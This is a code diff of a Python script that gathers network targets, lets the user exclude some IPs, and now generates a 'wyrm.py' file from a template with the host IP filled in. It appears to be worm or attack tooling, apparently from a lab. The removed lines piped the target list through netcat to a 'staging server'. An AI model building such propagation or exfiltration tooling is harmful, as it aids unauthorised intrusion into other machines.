@@ -19,7 +19,7 @@ def get_targets():
     print(potential_targets)
     return potential_targets
 
-def remove_unwanted(potential_targets):
+def get_unwanted(potential_targets):
 #given a list of potential targets, collect user input on which to remove from targets
 
 	x = 1
@@ -38,12 +38,7 @@ def remove_unwanted(potential_targets):
 	for i in unwanted:
 		unwanted_ips.append(potential_targets[int(i) - 1])
 
-	#remove unwanted ips from the final target list
-	for i in unwanted_ips:
-		potential_targets.remove(i)
-
-	print(potential_targets)
-	return potential_targets
+	return unwanted_ips
 
 def get_ip():
 #function to find the ip of the host device
@@ -58,17 +53,20 @@ def get_ip():
 	ip = findall(pattern, ifconfig)
 	return ip[0]
 
-def nc_sender():
-#given a list of targets, send it to the staging server
+def wyrm_setup(unwanted, ip):
+	with open("wyrm.py_source", "r") as wyrm:
+		wyrm_source = wyrm.read()
+		wyrm_source.replace("host_ip_here", ip)
+		wyrm_source.replace("insert_unwanted_here", str(unwanted))
 
-	sender = "echo " + targets + " | nc 192.168.56.2 1337"
-	subprocess.call(sender, shell=True)
+		with open("wyrm.py", "x") as wyrm:
+			wyrm.write(wyrm_source)
 
 def main():
 	ip = get_ip()
 	potential_targets = (get_targets())
-	targets = remove_unwanted(potential_targets)
-	nc_sender()
+	unwanted = get_unwanted(potential_targets)
+	wyrm_setup(unwanted, ip)
 
 if __name__ == "__main__":
 	main()
